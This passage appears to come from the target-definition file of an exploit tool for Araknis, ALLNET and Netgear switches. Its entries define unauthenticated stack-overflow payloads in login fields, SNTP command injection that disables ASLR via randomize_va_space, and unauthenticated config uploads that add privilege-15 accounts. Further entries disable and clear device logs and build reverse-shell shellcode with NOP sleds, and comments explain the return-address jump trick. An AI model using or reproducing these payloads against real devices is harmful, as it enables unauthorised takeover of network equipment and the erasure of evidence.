					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					# Bonus: Disable and clean logs
					#
					#
					'stack_cgi_add_account': {
						'description':'Stack overflow in "username/password" (PoC: add priv 15 credentials)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_del_account': {
						'description':'Stack overflow in "username/password" (PoC: del priv 15 credentials)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_diag': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,

						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
						'sys_ping_post_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True

					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'log_settings_set_cmd':'&en=0',				# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'&ta=0',					# Clean RAM CMD
						'log_ramClear_SIGSEGV':True,				# Clean RAM SIGSEGV ?

						'log_fileClear_cmd':'&ta=1',				# Clean FILE log CMD
						'log_fileClear_SIGSEGV':True,				# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'sys_timeSntp_set_cmd':'&sa=`echo 0 > /proc/sys/kernel/randomize_va_space`&sp=123',
						'sys_timeSntp_set_check':'&sa=`cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check`&sp=123',

						'sys_timeSntpDel_set_cmd':'&sa=+&sp=123',				# CMD

						'sys_timeSettings_set_cmd_enable':'&sn=1',	# Enable CMD
						'sys_timeSettings_set_cmd_disable':'&sn=0',	# Disable CMD
						'sys_timeSettings_set_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/conf_tmp/check',
						'vulnerable': True,
						'safe': True
					}, 
					#
					# Used for both 'heap' and 'stack'
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi-bin/security.cgi?login',
						'logout_uri':'/cgi-bin/security.cgi?logout',
						'query':'build=NOP&heap=NOP&to=NOP&higher=addresses&usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
						#'stack':False, # False = use Heap, and there are no ASLR
						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'Araknis': { 
				'vendor': 'Araknis Networks',
				'modulus_uri':'',
				'info_leak':True,
				'info_leak_JSON':False,
				'info_leak_uri':'/loginMsg.js',
				'xsid':False,
				'xsid_uri':'',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'',
					'login_uri':'',
					'query':'',
					'status_uri':'',
					'logout_uri':'',
					'vulnerable': False,
					'safe': True
				},
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'',
					'login_uri':'',
					'query':'',
					'status_uri':'',
					'logout_uri':'',
					'vulnerable': False,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':True,
						'disable_uri':'',
						'disable_query':'',
						'status':'',
						'clean_logfile_uri':'',
						'clean_logfile_query':'',
						'clean_logmem_uri':'',
						'clean_logmem_query':'',
						'vulnerable': False,
						'safe': True
				},
				# Verify lacking authentication
				'verify': { 
						'security.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/security.cgi?login',
							'content':'usr=admin&pswrd=' + self.random_string(280),
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'datajson.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/datajson.cgi?login',
							'content':'usr=admin&pswrd=' + self.random_string(288),
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/sn_httpupload.cgi?', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'authenticated': False,
						'json':True,
						'encryption':'',
						'content':'',
						'add_uri':'',
						'del_query':'',
						'del_uri':'',
						'vulnerable': False,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':True,
						'authenticated': True,	# <================================
						'enable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
						'enable_query':'{"_ds=1&sntpStatus=1&_de=1":{}}',
						'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
						'inject_uri':'/cgi/set.cgi?cmd=sys_timeSntp',
						'inject_query':'{"_ds=1&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123&_de=1":{}}',
						'check_query':'{"_ds=1&srvDef=byIp&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123&_de=1":{}}',
						'delete_uri':'/cgi/set.cgi?cmd=sys_timeSntpDel',
						'delete_query':'{"":{}}',
						'disable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
						'disable_query':'{"_ds=1&sntpStatus=0&_de=1":{}}',
						'verify_uri':'/tmp/check',
						'vulnerable': False, # It is vulnerable, but I am not using this authenticated code here :>
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_add_account': {
						'description':'Stack overflow in "username/password" (PoC: add priv 15 credentials)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_del_account': {
						'description':'Stack overflow in "username/password" (PoC: del priv 15 credentials)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_diag': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,

						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
						'sys_ping_post_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True

					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'log_settings_set_cmd':'&en=0',				# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'&ta=0',					# Clean RAM CMD
						'log_ramClear_SIGSEGV':True,				# Clean RAM SIGSEGV ?

						'log_fileClear_cmd':'&ta=1',				# Clean FILE log CMD
						'log_fileClear_SIGSEGV':True,				# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'sys_timeSntp_set_cmd':'&sa=`echo 0 > /proc/sys/kernel/randomize_va_space`&sp=123',
						'sys_timeSntp_set_check':'&sa=`cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check`&sp=123',

						'sys_timeSntpDel_set_cmd':'&sa=+&sp=123',				# CMD

						'sys_timeSettings_set_cmd_enable':'&sn=1',	# Enable CMD
						'sys_timeSettings_set_cmd_disable':'&sn=0',	# Disable CMD
						'sys_timeSettings_set_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/conf_tmp/check',
						'vulnerable': True,
						'safe': True
					}, 
					#
					# Used for both 'heap' and 'stack'
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi-bin/security.cgi?login',
						'logout_uri':'/cgi-bin/security.cgi?logout',
						'query':'build=NOP&heap=NOP&to=NOP&higher=addresses&usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
						'stack':False, # False = use Heap, and there are no ASLR
						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'ALLNET_JSON': { 
				'vendor': 'ALLNET GmbH Computersysteme',
				'model':'ALL-SG82xx',
				'uri':'https://www.allnet.de/',
				'modulus_uri':'/cgi/get.cgi?cmd=home_login',
				'info_leak':False,
				'info_leak_JSON':True,
				'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
				'xsid':False,
				'xsid_uri':'/cgi/get.cgi?cmd=home_main',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'rsa',
					'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
					'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
					'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
					'logout_uri':'/cgi/set.cgi?cmd=home_logout',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':True,
						'disable_uri':'/cgi/set.cgi?cmd=log_global',
						'disable_query':'{"_ds=1&empty=1&_de=1":{}}',
						'status':'/cgi/get.cgi?cmd=log_global',
						'clean_logfile_uri':'/cgi/set.cgi?cmd=log_clear',
						'clean_logfile_query':'{"_ds=1&target=1&_de=1":{}}',
						'clean_logmem_uri':'/cgi/set.cgi?cmd=log_clear',
						'clean_logmem_query':'{"_ds=1&target=0&_de=1":{}}',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': { 
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httpuploadruncfg.cgi',
							'check_uri':'/tmp/http_saverun_cfg',
							'content':'/var/config/running-config',
							'content_check':'/var/config/running-config',
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httprestorecfg.cgi',
							'check_uri':'/tmp/startup-config',
							'content':'/mnt/startup-config',
							'content_check':'/mnt/startup-config',
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'/tmp/http_uploadfail',
							'content':'Copy: Illegal software format', # Not the real content, its the result of invalid firmware (workaround)
							'content_check':'Copy: Illegal software format',
							'vulnerable': True,
							'safe': True
						},
						'login.cgi': {
							'description':'Stack overflow in login.cgi (PoC: create file /tmp/VUL.TXT)',
							'authenticated': False,
							'response':'file',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'check_uri':'/tmp/VUL.TXT', # We cannot control the content...
							'content':'{"_ds=1&username='+ self.random_string(40) +'&password='+ '/' * 23 +'/tmp/VUL.TXT&_de=1":{}}',
							'content_check':'2',
							'vulnerable': True,
							'safe': True
						},
						'set.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'authenticated': False,
						'json':True,
						'encryption':'clear',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
						'add_uri':'/cgi/httpuploadruncfg.cgi',
						'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
						'del_uri':'/cgi/set.cgi?cmd=sys_acctDel',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':True,
						'authenticated': True,
						'enable_uri':'/cgi/set.cgi?cmd=sys_time',
						'enable_query':'{"_ds=1&sntp=1&_de=1":{}}',
						'status_uri':'/cgi/get.cgi?cmd=sys_time',
						'inject_uri':'/cgi/set.cgi?cmd=sys_time',
						'inject_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&_de=1":{}}',
						'check_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&_de=1":{}}',
						'delete_uri':'/cgi/set.cgi?cmd=sys_time',
						'delete_query':'{"_ds=1&sntp=1&timezone=0&srvDef=ipv4&srvHost=+&port=0&dlsType=0&_de=1":{}}',
						'disable_uri':'/cgi/set.cgi?cmd=sys_time',
						'disable_query':'{"_ds=1&sntp=0&_de=1":{}}',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {	# Not vulnerable 
						'vulnerable': False,
					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',

						#'log_settings_set_cmd':'&logState=1&consoleState=1&ramState=1&fileState=1',	# Enable Logging CMD
						'log_settings_set_cmd':'&empty=1',			# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'&target=0',				# Clean RAM CMD
						'log_ramClear_SIGSEGV':True,				# Clean RAM SIGSEGV ?

						'log_fileClear_cmd':'&target=1',			# Clean FILE log CMD
						'log_fileClear_SIGSEGV':True,				# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
						'sys_timeSntp_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139',
						'sys_timeSntp_set_check':'&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139',

						'sys_timeSntpDel_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=+&port=139',				# CMD

						'sys_timeSettings_set_cmd_enable':'&sntp=1',	# Enable CMD
						'sys_timeSettings_set_cmd_disable':'&sntp=0',	# Disable CMD
						'sys_timeSettings_set_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': False,
						#'vulnerable': True,
						'safe': True
					}, 
					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'logout_uri':'/cgi/set.cgi?cmd=home_logout',
						'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
						'stack':True, # False = use Heap, and there are no ASLR
						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'ALLNET': {
				'vendor': 'ALLNET GmbH Computersysteme',
				'uri':'https://www.allnet.de/',
				'modulus_uri':'',
				'info_leak':False,
				'info_leak_JSON':False,
				'info_leak_uri':'',
				'xsid':False,
				'xsid_uri':'',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':False,
					'encryption':'clear',
					'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
					'query':'username=USERNAME&password=PASSWORD&login=1',
					'status_uri':'/cgi-bin/dispatcher.cgi?cmd=547',
					'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':False,
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'LOGGING_SERVICE=0&cmd=4353',
						'status':'/cgi-bin/dispatcher.cgi?cmd=4352',
						'clean_logfile_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logfile_query':'cmd_4364=Clear+file+messages',
						'clean_logmem_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logmem_query':'cmd_4364=Clear+buffered+messages',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': {
						'httpuploadbakcfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadbakcfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadruncfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httprestorecfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':'Image Signature Error',
							'vulnerable': True,
							'safe': True
						},
						'dispatcher.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'response':'502',
							'Content-Type':False,
							'authenticated': False,
							'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
							'content':'username=admin&password='+ self.random_string(184) + '&login=1',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'httpuploadfirmware.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadfirmware.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':'Image Signature Error',
							'vulnerable': True,
							'safe': True
						},
						'httpupload_runstart_cfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload_runstart_cfg.cgi',
							'check_uri':'/tmp/startup-config',
							'content':'/tmp/startup-config',
							'content_check':'/tmp/startup-config',
							'vulnerable': True,
							'safe': True
						},
						'version_upgrade.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (Frontend to "httpuploadfirmware.cgi")',
							'uri':'/cgi-bin/version_upgrade.cgi',
							'check_uri':'',
							'content':'Firm Upgrade',
							'content_check':'Firm Upgrade',
							'vulnerable': True,
							'safe': True
						},
						'factory_reset.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Reset device to factory default (PoC: Too dangerous to verify)',
							'uri':'/cgi-bin/factory_reset.cgi',
							'check_uri':'',
							'content':'Too dangerous to verify',
							'content_check':'dummy',
							'vulnerable': True,
							'safe': False
						},
						'sysinfo_config.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':False,
							'description':'System basic information configuration (Frontend to "change_mac_addr_set.cgi")',
							'uri':'/cgi-bin/sysinfo_config.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':'"/cgi-bin/change_mac_addr_set',
							'vulnerable': True,
							'safe': True
						},
						'change_mac_addr_set.cgi': {
							'description':'Stack overflow in "switch_type/sys_hardver" (PoC: crash CGI)',
							'response':'502',
							'Content-Type':False,
							'authenticated': False,
							'uri':'/cgi-bin/change_mac_addr_set.cgi',
							'content':'switch_type='+ self.random_string(116) +'&sys_hardver=31337&sys_macaddr=DE:AD:BE:EF:13:37&sys_serialnumber=DE:AD:BE:EF:13:37&password=tgnetadmin',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},

				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'json':False,
						'authenticated': False,
						'encryption':'clear',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
						'add_uri':'/cgi-bin/httpuploadruncfg.cgi',
						'del_query':'', 
						'del_uri':'/cgi-bin/dispatcher.cgi?cmd=524&usrName=USERNAME',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':False,
						'authenticated': True,
						'enable_uri':'/cgi-bin/dispatcher.cgi',
						'enable_query':'sntp_enable=1&cmd=548',
						'status_uri':'cmd=547',
						'inject_uri':'/cgi-bin/dispatcher.cgi',

						'inject_query':'sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123&cmd=550',
						'check_query':'sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123&cmd=550',

						'delete_uri':'/cgi-bin/dispatcher.cgi',
						'delete_query':'sntp_Server=+&sntp_Port=123&cmd=550',
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'sntp_enable=0&cmd=548',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},

					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {
						'vulnerable': False,
					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'_CMD_&login=1',

						'log_settings_set_cmd':'&LOGGING_SERVICE=0',			# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,						# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'',									# Clean RAM log CMD
						'log_ramClear_SIGSEGV':False,							# Clean RAM log SIGSEGV ?

						'log_fileClear_cmd':'',									# Clean FILE log CMD
						'log_fileClear_SIGSEGV':False,							# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'_CMD_&login=1',
						'sys_timeSntp_set_cmd':'&sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123',
						'sys_timeSntp_set_check':'&sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123',
						'sys_timeSntpDel_set_cmd':'&sntp_Server=+&sntp_Port=123',
						'sys_timeSettings_set_cmd_enable':'&sntp_enable=1',
						'sys_timeSettings_set_cmd_disable':'&sntp_enable=0',
						'sys_timeSettings_set_SIGSEGV': False,		# SIGSEGV ?
						'workaround':True,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					}, 

					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
						'query':'username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&login=1',
						'workaround':False,	# My LAB workaround
						#'stack':False, # False = use Heap, and there are no ASLR
						'stack':True, # False = use Heap, and there are no ASLR
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'Netgear': { 
				'vendor': 'NETGEAR Inc.',
				'modulus_uri':'/cgi/get.cgi?cmd=home_login',
				'info_leak':True,
				'info_leak_JSON':True,
				'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
				'xsid':False,
				'xsid_uri':'/cgi/get.cgi?cmd=home_main',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'rsa',
					'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
					'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
					'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
					'logout_uri':'/cgi/set.cgi?cmd=home_logout',
					'vulnerable': False,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':True,
						'disable_uri':'/cgi/set.cgi?cmd=log_settings',
						'disable_query':'{"_ds=1&ram_sev_0=on&ram_sev_1=on&ram_sev_2=on&ram_sev_3=on&ram_sev_4=on&ram_sev_5=on&ram_sev_6=on&_de=1":{}}',
						'status':'/cgi/get.cgi?cmd=log_settings',
						'clean_logfile_uri':'/cgi/set.cgi?cmd=log_fileClear',
						'clean_logfile_query':'{"":{}}',
